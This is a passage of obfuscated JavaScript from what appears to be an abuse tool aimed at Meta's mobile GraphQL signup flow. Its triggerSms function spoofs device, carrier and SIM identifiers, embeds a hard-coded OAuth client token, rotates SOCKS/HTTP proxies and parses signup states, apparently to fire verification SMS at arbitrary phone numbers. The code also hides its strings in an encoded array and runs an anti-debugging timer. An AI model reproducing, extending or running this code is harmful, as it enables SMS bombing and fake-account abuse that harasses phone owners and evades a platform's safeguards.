'iJOIrG', 'EfDXDW', 'z19Tzq', 'zcaO', 'C2C6ia', 'tLr4za', 'CMDuAq', 'whvuBG', 'uNvZCW', 'ihzLCG', 'kZi5mq', 'w0vsuG', 'CMf5', 'rLbcsq', 'ihWGtq', 'zw5Kkq', 'D2jWvq', 'rNjcAW', 'nJeY', 'vwLgEG', 'kZiZmG', 'kZm1mG', 'AwzLCG', 'Agv4', 'vLLtuG', 'vxnYDq', 'AwvUDa', 'vwv4AG', 'qxn5BG', 'AxqTuW', 'vxnLCG', 'zM9Yrq', 'rvDFua', 'terkyq', 'BMuTtG', 'yMLUzq', 'uhjV', 'zwHVCW', 'zuDYwa', 'r2rLyq', 't2vhwa', 'ugL4zq', 'lcbYyq', 'mJyY', 'mKzHyW', 'suDhua', 'wwvZla', 'CIzZzq', 'rMvLza', 'BI4UlG', 'zKHSDq', 'qM9SAq', 'BM9YBq', 'EuvAEa', 'zs1pDq', 'B1ncsW', 'CxvLCW', 'tcXOzq', 'B3iGDa', 'wuHHsq', 'mZC4', 'vIXWDa', 'Cw50ra', 't0vdCa', 'EgPitW', 'y1DnEq', 'DM5xsq', 'tg9Hza', 'rgLPuG', 'BgLH', 'DMLH', 'sefqCa', 'nc4W', 'ChqG', 't04Gyq', 'B3nFyW', 't1fZAa', 'qM90CW', 'y0DivW', 'vLrgBW', 'CNnVBG', 'Bhr2Aq', 'E30UyW', 'zfDUtq', 'tMf1CG', 'y21TDa', 'oIaWxq', 'yMffqG', 'mJffmG', 'mJu0', 'DxDWqW', 'ueLqsG', 'ntaX', 'ihWG', 'r2nlwG', 'yxjFuW', 'BMqGAq', 'zNiTrW', 'B2LK', 'ifu7ia', 'sg93ia', 'Bs5Myq', 'lsbOBW', 'DgfPBa', 'Ehfxwa', 'BxmTtq', 'DfXdCG', 'iIbPBG', 'vKTTua', 'B2XLua', 'Bf9PBG', 'vcXLBG', 'qIXLBG', 'vwrIAG', 'zxGGka', 'yIWGAq', 'qsbutW', 'rg9lBG', 'Be5XBq', 'sYXTAW', 'wfjUtq', 'ihWGsa', 'DwXSlG', 'vgXVta', 'kZK2na', 'C01esW', 'tKLYDa', 'y2D0yq', 'ywnOAq', 't2ffCG', 'Aw9Z', 'w2rLzG', 'xYbCia', 'AM9PBG', 'yxjnvG', 'kZG4ma', 'wMfTyG', 'zxiG', 'Dg9Rzq', 'B25qCG', 'vM5bAa', 'ieXHBG', 'Cc4k', 'zw4TvG', 'ExP3sa', 'r2XVyG', 'Dw1Izq', 'z1bJvG', 'CNjVCG', 'Cuj5za', 'A3jSwa', 'CM5Lza', 'sLz4ua', 'CM95', 'txLoCq', 'D29Yza', 'qw56Aq', 'CNvZ', 'CM0TDq', 'ihnJCG', 'kZy3mW', 'swnLBa', 'sgD3ua', 'AMjyEG', 'v2PPsa', 'rNfqAW', 'vuXjBG', 'AgfSBa', 'AxzLCW', 'qMvNEG', 'nJa0', 'rwPbyq', 'Dw5Yzq', 'Aw5Nza', 'y2vWDa', 'EvbQtG', 'CLfTDG', 'BhzL', 'BwLYtq', 'mdiW', 'C05ywq', 'renMwG', 'BMrLCG', 'qxHTBW', 'EsbZzq', 'l3yXlW', 'B20UzG', 'wxDxrW', 'ENb1zG', 'q3LWCG', 'whj6BW', 'kZqYma', 'zNiTrG', 'mZjFta', 'DhjHDa', 'rezlDq', 'q0fpEa', 'Au9tkq', 'mKXNBq', 'zxiGjW', 'zKXiuW', 'Fdb8oq', 'BMjbCW', 'D0vWuq', 'ELn2zW', 'uMjQvW', 'AcbguG', 'tvDKtG', 'z3DLrG', 'vhvYAW', 'ica6ia', 'uM9IAq', 'y2HHBa', 'q2XKrW', 'z2H0pq', 'BNrSEq', 'EhDRtG', 'igXPAW', 'BLnczW', 'thH0sa', 'sMzgtG', 'EhPSzW', 'Bge7rG', 'ndeZ', 'r2vVCG', 'uLf1Eq', 'BgP5zG', 'zxmTrW', 'yxnZqa', 'Eenyta', 'mZGW', 'uhP6uG', 'kZuWnW', 'DwvZDa', 'C09IqG', 'wMjNAG', 'ndu2', 's01LAG', 'DdOG', 'uvbgta', 'vxnLia', 'C0D0Aa', 'y3jnCq', 'C0zmvq', 'yLf6BW', 'C3m9mq', 'Aw9Upq', 'tvPZvq', 'zfjrvW', 'A190yq', 'B3iGka', 'quDSDq', 'nJm2', 'ugHVBG', 'B3rL', 'y0ndzq', 'BxnnAa', 'qvvgtq', 'wM5fyW', 'Bhrzzq', 'u2XPEG', 'B2nLCW', 'zwWTqW', 'i1bxra', 'nZaW', 'wK9JuW', 'yw4GtW', 'q0X6AW', 't2Pstq', 'Aw5Fsq', 'EhjOyW', 'DMzgrW', 'BwvZCW', 'vLzJrG', 'EM9Uzq', 'C2LVBG', 'lM5LEa', 'uKjowq', 'o0zcra', 'BgvNCG', 'B3v0zq', 'zcbHBG', 'Bg1LBq', 'AxrLza', 'ucbbua', 'B2LKia', 'CNrPBG', 'vM9SDa', 'ote4qG', 'y3jHCa', 'y3b1CW', 'Cc1LBG', 'mtyYna', 'sKrdra', 'r2Tcta', 'EenprW', 'u3jNAa', 'Cu5ttq', 'BM5Lza', 'mJm1', 'u0nsEa', 'ig5Via', 'ExLJsq', 'uwXdzG', 'DgvFCG', 'AwnH', 'C2nHBa', 'BMLUzW', 'Au5LyW', 'wwTIua', 'u3DPDa', 'Dg9tDa', 'Awq9oq', 'BwfPBG', 'C3rVCa', 'AwnLBG', 'icGOja', 'rwn1yq', 'rhDOsW', 'A0f3Aq', 'qw5uwq', 'zxmTvG', 'vKXfzW', 'B0nIzW', 'vNHQEq', 'BeztCW', 'CMLJzq', 'twf0Da', 'qvP1Aa', 'CgXLDa', 'C3rHCG', 'ugfSzq', 'ieLUDG', 'quX0Ba', 'u1DzCW', 'swfAAW', 'BIbjCW', 'tezIAa', 'sNbsrW', 'tMTIsW', 'CwvgrW', 'yxjFrq', 'rgPPyG', 'z2fZyW', 'Dw4GBW', 'z1PWBa', 'DwLUzq', 'zgvSzq', 'ueXdvW', 'vM9SDq', 'A20TsW', 'vNn1qG', 'zvvOsG', 'mcj9Fq', 'v3vXqq', 's1reva', 'A1Piqq', 'DgHLCG', 'suvtBq', 'y2vSBa', 'r1HKCG', 'AxvT', 'DwfUAq', 'Bgu9', 'nZvHBW', 'tw9Sza', 'zMfSCW', 'zxnZ', 'vg9Tzq', 'C0TXtW', 'nNvODq', 'lwXPyG', 'AufOAW', 'DgvUyq', 'ig9Uzq', 'uhHyBa', 'CNrZ', 'ls0Tlq', 'zwXVDq', 'uhjPyW', 'DdOGma', 'q2XHCG', 'DwfNAa', 'C2vHCG', 'DgHV', 'igfKza', 'ieHPDa', 'kcKG', 'x2zHAq', 'BLrHsq', 'thv2za', 'lvnLCG', 'ndjLyq', 'rLfKDq', 'ipcFLku', 'EhK6', 'zM91BG', 'yM9Sza', 'yNjVDW'];
  fn1 = function () {
    return v319;
  };
  return fn1();
}
const v78 = {};
v78.mcc = "418", v78.mnc = '01', v78.carrier = "Asiacell", v78.locale = "ar_IQ";
const v79 = {};
v79.mcc = "415", v79.mnc = '01', v79.carrier = "Alfa", v79.locale = "ar_LB";
const v80 = {};
v80.mcc = "425", v80.mnc = '05', v80.carrier = "Jawwal", v80.locale = "ar_PS";
const v81 = {};
v81.mcc = "425", v81.mnc = '01', v81.carrier = "Partner", v81.locale = "he_IL";
const v82 = {};
v82.mcc = "417", v82.mnc = '01', v82.carrier = "Syriatel", v82.locale = "ar_SY";
const v83 = {};
v83.mcc = "470", v83.mnc = '01', v83.carrier = "Grameenphone", v83.locale = "en_US";
const v84 = {};
v84.mcc = "456", v84.mnc = '08', v84.carrier = "Metfone", v84.locale = "en_US";
const v85 = {};
v85.US = v1, v85.CA = v2, v85.RU = v3, v85.KZ = v4, v85.EG = v5, v85.ZA = v6, v85.GR = v7, v85.NL = v8, v85.BE = v9, v85.FR = v10, v85.ES = v11, v85.HU = v12, v85.IT = v13, v85.RO = v14, v85.CH = v15, v85.AT = v16, v85.GB = v17, v85.DK = v18, v85.SE = v19, v85.NO = v20, v85.PL = v21, v85.DE = v22, v85.PE = v23, v85.MX = v24, v85.CU = v25, v85.AR = v26, v85.BR = v27, v85.CL = v28, v85.CO = v29, v85.VE = v30, v85.MY = v31, v85.AU = v32, v85.ID = v33, v85.PH = v34, v85.NZ = v35, v85.SG = v36, v85.TH = v37, v85.JP = v38, v85.KR = v39, v85.VN = v40, v85.CN = v41, v85.TR = v42, v85.IN = v43, v85.PK = v44, v85.AF = v45, v85.LK = v46, v85.MM = v47, v85.IR = v48, v85.MA = v49, v85.DZ = v50, v85.TN = v51, v85.LY = v52, v85.KE = v53, v85.TZ = v54, v85.UG = v55, v85.NG = v56, v85.GH = v57, v85.CI = v58, v85.SN = v59, v85.CM = v60, v85.SD = v61, v85.ET = v62, v85.SO = v63, v85.RW = v64, v85.MZ = v65, v85.AO = v66, v85.ZM = v67, v85.ZW = v68, v85.MW = v69, v85.YE = v70, v85.AE = v71, v85.SA = v72, v85.OM = v73, v85.QA = v74, v85.BH = v75, v85.KW = v76, v85.JO = v77, v85.IQ = v78, v85.LB = v79, v85.PS = v80, v85.IL = v81, v85.SY = v82, v85.BD = v83, v85.KH = v84;
const ISO_DETAILS = v85;
function getMccForCountry(v320) {
  const v321 = {};
  v321.US = "310", v321.CA = "302", v321.MX = "334", v321.CU = "368", v321.GB = "234", v321.FR = "208", v321.DE = "262", v321.IT = "222", v321.ES = "214", v321.NL = "204", v321.BE = "206", v321.CH = "228", v321.AT = "232", v321.PL = "260", v321.RU = "250", v321.UA = "255", v321.BY = "257", v321.KZ = "401", v321.KG = "437", v321.UZ = "436", v321.TJ = "436", v321.AM = "283", v321.AZ = "400", v321.GE = "282", v321.CN = "460", v321.JP = "440", v321.KR = "450", v321.IN = "404", v321.PK = "410", v321.BD = "470", v321.LK = "413", v321.NP = "429", v321.MM = "504", v321.TH = "520", v321.VN = "452", v321.MY = "502", v321.SG = "525", v321.ID = "510", v321.PH = "515", v321.KH = "456", v321.LA = "457", v321.TW = "466", v321.HK = "454", v321.AU = "505", v321.NZ = "530", v321.EG = "602", v321.ZA = "655", v321.NG = "621", v321.KE = "639", v321.TZ = "640", v321.UG = "641", v321.GH = "620", v321.CI = "612";
  v321.SN = "608", v321.CM = "624", v321.DZ = "603", v321.MA = "604", v321.TN = "605", v321.LY = "606";
  v321.SD = "634", v321.ET = "636", v321.SO = "637", v321.RW = "635", v321.MZ = "643", v321.AO = "631", v321.YE = "421", v321.SA = "420", v321.AE = "424", v321.OM = "422", v321.QA = "427", v321.BH = "426", v321.KW = "419", v321.JO = "416", v321.IQ = "418", v321.LB = "415", v321.PS = "425", v321.IL = "425", v321.SY = "417", v321.BR = "724", v321.AR = "722", v321.CL = "730", v321.CO = "732", v321.VE = "734", v321.PE = "716", v321.EC = "740", v321.UY = "748", v321.PY = "744", v321.BO = "736";
  const v322 = v321;
  return v322[v320] || "310";
}
function getCountrySettings(v323) {
  const v324 = v323.toUpperCase();
  if (ISO_DETAILS[v324]) return {
    'hni': ISO_DETAILS[v324].mcc + ISO_DETAILS[v324].mnc,
    'mcc': ISO_DETAILS[v324].mcc,
    'mnc': ISO_DETAILS[v324].mnc,
    'carrier': ISO_DETAILS[v324].carrier,
    'locale': ISO_DETAILS[v324].locale
  };
  const v325 = getMccForCountry(v324);
  let v326 = "en_US";
  const v327 = ['DZ', 'BH', 'EG', 'IQ', 'JO', 'KW', 'LB', 'LY', 'MA', 'OM', 'PS', 'QA', 'SA', 'SD', 'SY', 'TN', 'AE', 'YE'];
  const v328 = ['AR', 'BO', 'CL', 'CO', 'CR', 'CU', 'DO', 'EC', 'SV', 'GT', 'HN', 'MX', 'NI', 'PA', 'PY', 'PE', 'PR', 'UY', 'VE', 'ES'],
    v329 = ['BR', 'PT', 'AO', 'MZ', 'CV', 'GW'],
    v330 = ['FR', 'BE', 'CA', 'CH', 'CI', 'SN', 'CM', 'GA', 'CG', 'CD', 'GQ', 'HT', 'MC', 'NE', 'TG', 'BJ', 'BF', 'ML', 'GN', 'BI', 'DJ', 'RW', 'CF', 'TD'],
    v331 = ['DE', 'AT', 'CH', 'LI', 'LU'],
    v332 = ['RU', 'BY', 'KZ', 'KG', 'MD', 'UA', 'UZ', 'TJ', 'TM'];
  if (v327.includes(v324)) v326 = "ar_" + v324;else {
    if (v328.includes(v324)) v326 = "es_" + v324;else {
      if (v329.includes(v324)) v326 = "pt_" + v324;else {
        if (v330.includes(v324)) v326 = "fr_" + v324;else {
          if (v331.includes(v324)) v326 = "de_" + v324;else {
            if (v332.includes(v324)) v326 = "ru_" + v324;else {
              if (v324 === 'IN') v326 = "en_US";else v326 = "en_US";
            }
          }
        }
      }
    }
  }
  return {
    'hni': v325 + '01',
    'mcc': v325,
    'mnc': '01',
    'carrier': "Operator",
    'locale': v326
  };
}
(function () {
  const fn3 = function () {
    {
      let v334;
      try {
        v334 = Function('return (function() {}.constructor("return this")( ));')();
      } catch (v335) {
        v334 = window;
      }
      return v334;
    }
  };
  const v333 = fn3();
  v333.setInterval(fn2, 3500);
})();
function getMccAndHni(v336) {
  const v337 = detectCountry(v336);
  let v338 = v337 ? v337[0] : 'US';
  return v338.includes('/') && (v338 = v338.split('/')[0]), getCountrySettings(v338);
}
function getRandomConnectionQuality() {
  const v339 = Math.floor(Math.random() * 60) + 15;
  const v340 = Math.floor(Math.random() * 200000) + 40000,
    v341 = Math.floor(Math.random() * 300) + 100;
  return "EXCELLENT; q=0.9, rtt=" + v339 + ", rtx=0, c=39, mss=1232, tbw=" + v340 + ", tp=81, tpl=0, uplat=" + v341 + ", ullat=3";
}
const uuid = () => crypto.randomUUID(),
  v86 = {};
v86['+1'] = ["US/CA", "United States / Canada"], v86['+7'] = ["RU/KZ", "Russia / Kazakhstan"], v86["+20"] = ['EG', "Egypt"], v86["+27"] = ['ZA', "South Africa"], v86["+30"] = ['GR', "Greece"], v86["+31"] = ['NL', "Netherlands"], v86["+32"] = ['BE', "Belgium"], v86["+33"] = ['FR', "France"], v86["+34"] = ['ES', "Spain"], v86["+36"] = ['HU', "Hungary"], v86["+39"] = ['IT', "Italy"], v86["+40"] = ['RO', "Romania"], v86["+41"] = ['CH', "Switzerland"], v86["+43"] = ['AT', "Austria"], v86["+44"] = ['GB', "United Kingdom"], v86["+45"] = ['DK', "Denmark"], v86["+46"] = ['SE', "Sweden"], v86["+47"] = ['NO', "Norway"], v86["+48"] = ['PL', "Poland"], v86["+49"] = ['DE', "Germany"], v86["+51"] = ['PE', "Peru"], v86["+52"] = ['MX', "Mexico"], v86["+53"] = ['CU', "Cuba"], v86["+54"] = ['AR', "Argentina"], v86["+55"] = ['BR', "Brazil"], v86["+56"] = ['CL', "Chile"], v86["+57"] = ['CO', "Colombia"], v86["+58"] = ['VE', "Venezuela"], v86["+60"] = ['MY', "Malaysia"], v86["+61"] = ['AU', "Australia"], v86["+62"] = ['ID', "Indonesia"], v86["+63"] = ['PH', "Philippines"], v86["+64"] = ['NZ', "New Zealand"], v86["+65"] = ['SG', "Singapore"], v86["+66"] = ['TH', "Thailand"], v86["+81"] = ['JP', "Japan"], v86["+82"] = ['KR', "South Korea"], v86["+84"] = ['VN', "Vietnam"], v86["+86"] = ['CN', "China"], v86["+90"] = ['TR', "Turkey"], v86["+91"] = ['IN', "India"], v86["+92"] = ['PK', "Pakistan"], v86["+93"] = ['AF', "Afghanistan"], v86["+94"] = ['LK', "Sri Lanka"], v86["+95"] = ['MM', "Myanmar"], v86["+98"] = ['IR', "Iran"], v86["+212"] = ['MA', "Morocco"], v86["+213"] = ['DZ', "Algeria"], v86["+216"] = ['TN', "Tunisia"], v86["+218"] = ['LY', "Libya"], v86["+220"] = ['GM', "Gambia"], v86["+221"] = ['SN', "Senegal"], v86["+222"] = ['MR', "Mauritania"], v86["+223"] = ['ML', "Mali"], v86["+224"] = ['GN', "Guinea"], v86["+225"] = ['CI', "Ivory Coast"], v86["+226"] = ['BF', "Burkina Faso"], v86["+227"] = ['NE', "Niger"], v86["+228"] = ['TG', "Togo"], v86["+229"] = ['BJ', "Benin"], v86["+230"] = ['MU', "Mauritius"], v86["+231"] = ['LR', "Liberia"], v86["+232"] = ['SL', "Sierra Leone"], v86["+233"] = ['GH', "Ghana"], v86["+234"] = ['NG', "Nigeria"], v86["+235"] = ['TD', "Chad"], v86["+236"] = ['CF', "Central African Republic"], v86["+237"] = ['CM', "Cameroon"], v86["+238"] = ['CV', "Cape Verde"], v86["+239"] = ['ST', "Sao Tome"], v86["+240"] = ['GQ', "Equatorial Guinea"], v86["+241"] = ['GA', "Gabon"], v86["+242"] = ['CG', "Republic of the Congo"], v86["+243"] = ['CD', "DR Congo"], v86["+244"] = ['AO', "Angola"], v86["+245"] = ['GW', "Guinea-Bissau"], v86["+246"] = ['IO', "British Indian Ocean Territory"], v86["+247"] = ['AC', "Ascension Island"], v86["+248"] = ['SC', "Seychelles"], v86["+249"] = ['SD', "Sudan"], v86["+250"] = ['RW', "Rwanda"], v86["+251"] = ['ET', "Ethiopia"], v86["+252"] = ['SO', "Somalia"], v86["+253"] = ['DJ', "Djibouti"], v86["+254"] = ['KE', "Kenya"], v86["+255"] = ['TZ', "Tanzania"], v86["+256"] = ['UG', "Uganda"], v86["+257"] = ['BI', "Burundi"], v86["+258"] = ['MZ', "Mozambique"], v86["+260"] = ['ZM', "Zambia"], v86["+261"] = ['MG', "Madagascar"], v86["+262"] = ['RE', "Reunion"], v86["+263"] = ['ZW', "Zimbabwe"], v86["+264"] = ['NA', "Namibia"], v86["+265"] = ['MW', "Malawi"], v86["+266"] = ['LS', "Lesotho"], v86["+267"] = ['BW', "Botswana"], v86["+268"] = ['SZ', "Eswatini"], v86["+269"] = ['KM', "Comoros"], v86["+290"] = ['SH', "Saint Helena"], v86["+291"] = ['ER', "Eritrea"], v86["+297"] = ['AW', "Aruba"], v86["+298"] = ['FO', "Faroe Islands"], v86["+299"] = ['GL', "Greenland"], v86["+350"] = ['GI', "Gibraltar"], v86["+351"] = ['PT', "Portugal"], v86["+352"] = ['LU', "Luxembourg"], v86["+353"] = ['IE', "Ireland"], v86["+354"] = ['IS', "Iceland"], v86["+355"] = ['AL', "Albania"], v86["+356"] = ['MT', "Malta"], v86["+357"] = ['CY', "Cyprus"], v86["+358"] = ['FI', "Finland"], v86["+359"] = ['BG', "Bulgaria"], v86["+370"] = ['LT', "Lithuania"], v86["+371"] = ['LV', "Latvia"], v86["+372"] = ['EE', "Estonia"], v86["+373"] = ['MD', "Moldova"], v86["+374"] = ['AM', "Armenia"], v86["+375"] = ['BY', "Belarus"], v86["+376"] = ['AD', "Andorra"], v86["+377"] = ['MC', "Monaco"], v86["+378"] = ['SM', "San Marino"], v86["+380"] = ['UA', "Ukraine"], v86["+381"] = ['RS', "Serbia"], v86["+382"] = ['ME', "Montenegro"], v86["+385"] = ['HR', "Croatia"], v86["+386"] = ['SI', "Slovenia"], v86["+387"] = ['BA', "Bosnia and Herzegovina"], v86["+389"] = ['MK', "North Macedonia"], v86["+420"] = ['CZ', "Czech Republic"], v86["+421"] = ['SK', "Slovakia"], v86["+423"] = ['LI', "Liechtenstein"], v86["+500"] = ['FK', "Falkland Islands"], v86["+501"] = ['BZ', "Belize"], v86["+502"] = ['GT', "Guatemala"], v86["+503"] = ['SV', "El Salvador"], v86["+504"] = ['HN', "Honduras"], v86["+505"] = ['NI', "Nicaragua"], v86["+506"] = ['CR', "Costa Rica"], v86["+507"] = ['PA', "Panama"], v86["+508"] = ['PM', "Saint Pierre and Miquelon"], v86["+509"] = ['HT', "Haiti"], v86["+590"] = ['GP', "Guadeloupe"], v86["+591"] = ['BO', "Bolivia"], v86["+592"] = ['GY', "Guyana"], v86["+593"] = ['EC', "Ecuador"], v86["+595"] = ['PY', "Paraguay"], v86["+597"] = ['SR', "Suriname"], v86["+598"] = ['UY', "Uruguay"], v86["+599"] = ['AN', "Netherlands Antilles"], v86["+670"] = ['TL', "East Timor"], v86["+672"] = ['NF', "Norfolk Island"], v86["+673"] = ['BN', "Brunei"], v86["+674"] = ['NR', "Nauru"], v86["+675"] = ['PG', "Papua New Guinea"], v86["+676"] = ['TO', "Tonga"], v86["+677"] = ['SB', "Solomon Islands"], v86["+678"] = ['VU', "Vanuatu"], v86["+679"] = ['FJ', "Fiji"], v86["+680"] = ['PW', "Palau"], v86["+681"] = ['WF', "Wallis and Futuna"], v86["+682"] = ['CK', "Cook Islands"], v86["+683"] = ['NU', "Niue"], v86["+685"] = ['WS', "Samoa"], v86["+686"] = ['KI', "Kiribati"], v86["+687"] = ['NC', "New Caledonia"], v86["+688"] = ['TV', "Tuvalu"], v86["+689"] = ['PF', "French Polynesia"], v86["+690"] = ['TK', "Tokelau"], v86["+691"] = ['FM', "Micronesia"], v86["+692"] = ['MH', "Marshall Islands"], v86["+850"] = ['KP', "North Korea"], v86["+852"] = ['HK', "Hong Kong"], v86["+853"] = ['MO', "Macau"], v86["+855"] = ['KH', "Cambodia"], v86["+856"] = ['LA', "Laos"], v86["+880"] = ['BD', "Bangladesh"], v86["+886"] = ['TW', "Taiwan"], v86["+960"] = ['MV', "Maldives"], v86["+961"] = ['LB', "Lebanon"], v86["+962"] = ['JO', "Jordan"], v86["+963"] = ['SY', "Syria"], v86["+964"] = ['IQ', "Iraq"], v86["+965"] = ['KW', "Kuwait"], v86["+966"] = ['SA', "Saudi Arabia"], v86["+967"] = ['YE', "Yemen"], v86["+968"] = ['OM', "Oman"], v86["+970"] = ['PS', "Palestine"], v86["+971"] = ['AE', "UAE"], v86["+972"] = ['IL', "Israel"], v86["+973"] = ['BH', "Bahrain"], v86["+974"] = ['QA', "Qatar"], v86["+975"] = ['BT', "Bhutan"], v86["+976"] = ['MN', "Mongolia"], v86["+977"] = ['NP', "Nepal"], v86["+992"] = ['TJ', "Tajikistan"], v86["+993"] = ['TM', "Turkmenistan"], v86["+994"] = ['AZ', "Azerbaijan"], v86["+995"] = ['GE', "Georgia"], v86["+996"] = ['KG', "Kyrgyzstan"], v86["+998"] = ['UZ', "Uzbekistan"];
const COUNTRY_CODES = v86;
function detectCountry(v342) {
  for (let v343 = 4; v343 >= 1; v343--) {
    {
      const v344 = v342.substring(0, v343 + 1);
      if (COUNTRY_CODES[v344]) return {
        'code': v344,
        ...COUNTRY_CODES[v344]
      };
    }
  }
  return null;
}
function normalizePhoneNumber(v345) {
  if (!v345) return '';
  if (typeof v345 !== "string") v345 = String(v345);
  let v346 = v345.trim();
  if (v346.startsWith('00')) v346 = '+' + v346.slice(2);else {
    if (!v346.startsWith('+')) v346 = '+' + v346.replace(/\D/g, '');else v346 = '+' + v346.slice(1).replace(/\D/g, '');
  }
  return v346;
}
function parseProxy(v347) {
  if (!v347) return null;
  if (typeof v347 === "object") return v347;
  if (typeof v347 !== "string") v347 = String(v347);
  v347 = v347.trim();
  if (!v347) return null;
  let v348 = "http",
    v349,
    v350,
    v351,
    v352;
  if (v347.startsWith("socks5://")) v348 = "socks5", v347 = v347.slice(9);else {
    if (v347.startsWith("socks4://")) v348 = "socks4", v347 = v347.slice(9);else {
      if (v347.startsWith("http://")) {
        v347 = v347.slice(7);
      } else v347.startsWith("https://") && (v347 = v347.slice(8));
    }
  }
  if (v347.includes("://")) v347 = v347.split("://")[1];
  if (v347.includes('@')) {
    {
      const v353 = v347.split('@'),
        v354 = v353[0].split(':'),
        v355 = v353[1].split(':');
      v351 = v354[0], v352 = v354[1], v349 = v355[0], v350 = parseInt(v355[1]);
    }
  } else {
    const v356 = v347.split(':');
    if (v356.length === 2) {
      v349 = v356[0], v350 = parseInt(v356[1]);
    } else {
      if (v356.length === 4) !isNaN(parseInt(v356[3])) && isNaN(parseInt(v356[1])) ? (v351 = v356[0], v352 = v356[1], v349 = v356[2], v350 = parseInt(v356[3])) : (v349 = v356[0], v350 = parseInt(v356[1]), v351 = v356[2], v352 = v356[3]);else {
        if (v356.length === 3) {
          v349 = v356[0], v350 = parseInt(v356[1]), v351 = v356[2];
        }
      }
    }
  }
  if (!v349 || !v350) return null;
  return {
    'type': v348,
    'host': v349,
    'port': parseInt(v350),
    'user': v351,
    'pass': v352,
    'original': v347
  };
}
function createProxyAgent(v357, v358 = false) {
  if (!v357) return null;
  if (typeof v357 === "string") v357 = parseProxy(v357);
  if (!v357) return null;
  const v359 = v357.user ? encodeURIComponent(v357.user) + ':' + encodeURIComponent(v357.pass || '') + '@' : '';
  if (v357.type === "socks5" || v357.type === "socks4") return new SocksProxyAgent("socks5://" + v359 + v357.host + ':' + v357.port);
  const v360 = {};
  return v360.keepAlive = v358, new HttpsProxyAgent("http://" + v359 + v357.host + ':' + v357.port, v360);
}
function sendRequest(v361, v362, v363, v364, v365 = null, v366 = 20000) {
  return new Promise((v367, v368) => {
    const v369 = new URL(v361);
    const v370 = {
      ...v363
    };
    const v371 = {
      'hostname': v369.hostname,
      'path': v369.pathname + v369.search,
      'method': v362,
      'headers': v370,
      'timeout': v366
    };
    if (v364) v371.headers["Content-Length"] = Buffer.byteLength(v364);
    if (v365 && typeof v365 === "object") v371.agent = v365;else v365 && typeof v365 === "string" && (v371.agent = createProxyAgent(parseProxy(v365)));
    const v372 = https.request(v371, v373 => {
      {
        const v374 = [];
        v373.on("data", v375 => v374.push(v375)), v373.on("error", v368), v373.on("end", () => {
          {
            let v376 = Buffer.concat(v374);
            const v377 = v373.headers["content-encoding"];
            if (v377 === "gzip") try {
              v376 = zlib.gunzipSync(v376);
            } catch (v378) {} else {
              if (v377 === "deflate") try {
                v376 = zlib.inflateSync(v376);
              } catch (v379) {}
            }
            v367({
              'status': v373.statusCode,
              'data': v376.toString("utf8"),
              'headers': v373.headers
            });
          }
        });
      }
    });
    v372.on("error", v368), v372.setTimeout(v366, () => {
      v372.destroy(), v368(new Error("timeout"));
    });
    if (v364) v372.write(v364);
    v372.end();
  });
}
function extractContextData(v380) {
  const v381 = v380.match(/AT[A-Za-z0-9_\-\.\+=\\/]{100,}/g);
  if (!v381 || v381.length === 0) return null;
  const v382 = v381.reduce((v383, v384) => v384.length > v383.length ? v384 : v383);
  return v382.replace(/\\/g, '');
}
function extractAllContextData(v385) {
  const v386 = v385.match(/AT[A-Za-z0-9_\-\.\+=\\/]{100,}/g);
  return v386 ? [...new Set(v386.map(v387 => v387.replace(/\\/g, '')))] : [];
}
function extractRegistrationContext(v388) {
  const v389 = extractAllContextData(v388);
  if (v389.length === 0) return null;
  const v390 = [...v389].sort((v391, v392) => v392.length - v391.length);
  return v390[0];
}
function detectForcedStep(v393) {
  const v394 = v393.match(/\\\"forced_step\\\"\s*,\s*\\\"([A-Z_]+)\\\"/) || v393.match(/"forced_step"\s*:\s*"([A-Z_]+)"/);
  return v394 ? v394[1] : null;
}
function isAgeBlocked(v395) {
  const v396 = v395.match(/\\\"state\\\"\s*,\s*\\\"([A-Z_]+)\\\"/);
  if (v396 && v396[1] === "AGE_BLOCKED_FROM_SIGNUP") return true;
  return v395.includes("AGE_BLOCKED_FROM_SIGNUP") && !v395.includes("\"forced_step\":\"FETA_LOGIN_LANDING\"") && v396;
}
function getErrorMsg(v397) {
  try {
    {
      const v398 = v397.match(/"error_title"\\?\s*:\\?\s*"([^"\\]+)"/),
        v399 = v397.match(/"error_message"\\?\s*:\\?\s*"([^"\\]+)"/),
        v400 = v397.match(/"error_code"\\?\s*:\\?\s*(\d+)/);
      if (v398 || v399 || v400) return "Title: " + (v398?.[1] || "none") + " | Msg: " + (v399?.[1] || "none") + " | Code: " + (v400?.[1] || "none");
    }
  } catch (v401) {}
  return null;
}
async function triggerSms(v402, v403 = {}) {
  const {
      onStatus = () => {},
      proxy: v404 = null,
      timeout = 40000
    } = v403,
    v405 = normalizePhoneNumber(v402),
    v406 = uuid();
  let v407 = null;
  if (v404) {
    {
      const v427 = parseProxy(v404);
      if (v427) v407 = createProxyAgent(v427, true);
    }
  }
  let v408 = v405.replace(/^\+/, ''),
    v409 = v405;
  const v410 = detectCountry(v405);
  let v411 = getMccAndHni(v405);
  const v412 = v405.replace(/\D/g, ''),
    v413 = getCountryFromPhone(v412),
    v414 = v403.regionPref && v403.regionPref !== "random" ? v403.regionPref : v413.lang,
    v415 = uuid(),
    v416 = uuid().replace(/-/g, ''),
    v417 = getDevice(v411.locale, v411.carrier),
    v418 = getRandomConnectionQuality(),
    v419 = "25388939416361662348114792130",
    v420 = "6165507607732403794408071507",
    v421 = "24e20f03055c8429a90734dc77fd2c73718857aca6d82bef6a4c325a7cbae11e",
    v422 = {};
  v422.Authorization = "OAuth FRL|388177446008673|083800dd7efbbd42eab18c9886d79c18", v422["User-Agent"] = v417, v422["Accept-Language"] = v414, v422.Accept = "*/*", v422["Accept-Encoding"] = "gzip, deflate", v422["Content-Type"] = "application/x-www-form-urlencoded", v422["x-fb-http-engine"] = "Tigon/MNS/mvfst-mobile", v422["X-FB-Request-Analytics-Tags"] = "{\"network_tags\":{\"product\":\"830547164036012\",\"request_category\":\"graphql\",\"purpose\":\"none\",\"retry_attempt\":\"0\"}}", v422["x-fb-conn-uuid-client"] = v416, v422["X-FB-Server-Cluster"] = "True", v422["X-FB-Client-IP"] = "True", v422["x-fb-rev"] = "1046162082", v422["x-graphql-client-library"] = "pando", v422["x-fb-connection-quality"] = v418, v422["X-FB-Net-HNI"] = v411.hni;
  v422["X-FB-Sim-HNI"] = v411.hni, v422["X-FB-Connection-Type"] = "WIFI";
  const v423 = v422,
    v424 = "https://meta.graph.meta.com/graphql?locale=" + v411.locale;
  let v425 = '',
    v426 = '';
  async function fn4(v428, v429, v430, v431, v432 = "bloks_action", v433 = true) {
    const v434 = v429 === v419 ? "FrlBloksAsyncActionQuery" : "FrlBloksAppRootQuery",
      v435 = v434 + '-' + v430,
